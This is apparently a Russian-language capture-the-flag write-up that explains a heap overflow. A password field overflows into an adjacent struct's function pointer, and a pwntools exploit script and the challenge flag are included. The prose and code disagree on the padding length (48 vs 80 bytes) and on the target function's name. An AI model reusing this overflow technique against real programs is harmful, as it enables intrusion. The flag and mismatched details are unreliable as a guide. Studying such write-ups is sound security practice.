# Task: Ticket to the Top

###  Анализ уязвимости

Структуры данных. Программа использует две структуры:

```C
struct user {
    char username[32];
    char password[32];
};
```
Размер структуры: 64 байта (32 байта для username и 32 для password).

```C
typedef struct ticket {
    void (*display)(struct ticket*);
    char username[32];
    char content[24];
} 
```
Размер структуры: 64 байта (8 байт для указателя на функцию display, 32 байта для username и 24 байта для content).

Обе структуры занимают 64 байта, что удобно, так как выделенные блоки для этих структур располагаются рядом в памяти.

Функция login. Функция login проверяет, соответствует ли введённый пароль секретному значению из файла .passwd и строке "admin". Если они совпадают, пользователь получает доступ к функции admin.

```C
char login(struct user *u) {
    char secret[16] = "";
    FILE *fp = fopen(".passwd", "r");
    fread(secret, 1, 15, fp);
    fclose(fp);

    if (strcmp(u->password, secret) == 0 && strcmp(u->password, "admin") == 0) {
        return 1;
    }
    return 0;
}

```

Программа выделяет память для структур user и ticket, после чего выполняет цикл с меню, где пользователь может выбрать действия. Уязвимость заключается в том, что поле content структуры ticket и поля структуры user могут быть переполнены, что позволяет изменить данные соседнего блока в памяти.

### Эксплуатация уязвимости

Цель состоит в том, чтобы перезаписать указатель display структуры ticket, направив его на функцию win. Так как обе структуры находятся рядом в памяти, мы можем перезаписать display из структуры user.

### Подготовка эксплойта

Позиции структур:
* u (user) располагается по адресу 0x4052a0
* t (ticket) располагается по адресу 0x4052f0

Для того чтобы перезаписать указатель display, необходимо переполнить поле password в структуре user на 48 байт, а затем записать адрес функции admin. Адрес будет передан как часть строки пароля, состоящей из 48 символов B и адреса функции admin.

```python
from pwn import *


# Connect remotely via nc to localhost on port 12345
p = remote("localhost", 12345)

p.sendline()

target = p64(0x00000000004012e8)

def choice(c):
    p.sendline()
    p.recv(timeout=1)
    p.sendline(c)

def login(username, password):
    choice(b'5')
    p.recv(timeout=1)
    p.sendline(username)
    p.recv(timeout=1)
    p.sendline(password)

login(b"A", b"B"*80 + target)
choice(b'1')

p.interactive()
p.close()
```

Flag: `EclipseCTF{un1qu3_h3ap_0v3rfl0w_ch4ll3ng3_5z7y8}`